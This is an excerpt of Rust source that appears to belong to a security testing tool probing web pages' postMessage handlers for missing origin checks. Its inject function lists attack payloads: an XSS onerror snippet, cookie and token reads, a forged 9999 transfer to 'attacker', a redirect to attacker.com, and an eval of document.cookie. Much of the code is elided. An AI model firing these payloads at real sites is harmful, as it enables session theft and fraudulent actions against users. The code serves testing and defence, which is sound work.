...
pub async fn origin(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    let bypasses = [
        ...
        (
            ...
            "addEventListener('message', function(e) { /* no origin check */ }",
        ),
        ...
        (
            "No source check",
            "e.source.postMessage(/* reply without verifying source */",
        ),
    ];

    println!("\n  {} Origin bypass vectors:", "[*]".cyan().bold());
    for (name, pattern) in &bypasses {
        let detected = body.contains(pattern)
            || (pattern.contains("origin")
                && body.contains("origin")
                && !body.contains("=== 'https://"));
        let tag = if detected {
            "DETECTED".red().bold().to_string()
        } else {
            "not found".to_string()
        };
    ...
    println!(
        "\n{} Inject payloads via: window.postMessage(payload, '*')",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn inject(url: &str, _timeout: u64) -> anyhow::Result<()> {
    ...
    let payloads = [
        (
            "XSS via innerHTML",
            r#"{"action":"render","html":"<img src=x onerror=alert(1)>"}"#,
        ),
        ("Cookie exfil", r#"{"action":"getData","type":"cookies"}"#),
        (
            "CSRF trigger",
            r#"{"action":"submit","form":"transfer","to":"attacker","amount":"9999"}"#,
        ),
        (
            "Navigate",
            r#"{"action":"navigate","url":"https://attacker.com"}"#,
        ),
        ("Eval", r#"{"action":"eval","code":"document.cookie"}"#),
        ("Storage read", r#"{"action":"getStorage","key":"token"}"#),
        (
            "Storage write",
            r#"{"action":"setStorage","key":"token","value":"attacker_token"}"#,
        ),
        (
            "Fetch proxy",
            r#"{"action":"fetch","url":"/admin/api/users","method":"GET"}"#,
        ),
    ];

    println!(
        "  {} Injection payloads (deliver via postMessage):",
        "[*]".cyan().bold()
    );
...
pub async fn fuzz(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    println!(
        "  {} Fuzz payloads to send via postMessage:",
        "[*]".cyan().bold()
    );
    ...
    println!(
        "\n  {} Look for: DOM changes, errors, network requests, storage modifications.",
        "[*]".cyan().bold()
    );
    Ok(())
}
...
pub async fn chain(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    if iframes.is_empty() {
        ...
        println!(
            "  {} Iframes found (potential chain targets):",
            "[*]".cyan().bold()
        );
    ...
    if chains.is_empty() {
        println!(
            "  {} No cross-frame communication patterns found.",
            "[-]".green().bold()
        );
    } else {
        println!(
            "\n{} {} chaining pattern(s) found — cross-frame attack possible.",
            "[!]".red().bold(),
            chains.len()
        );
    }
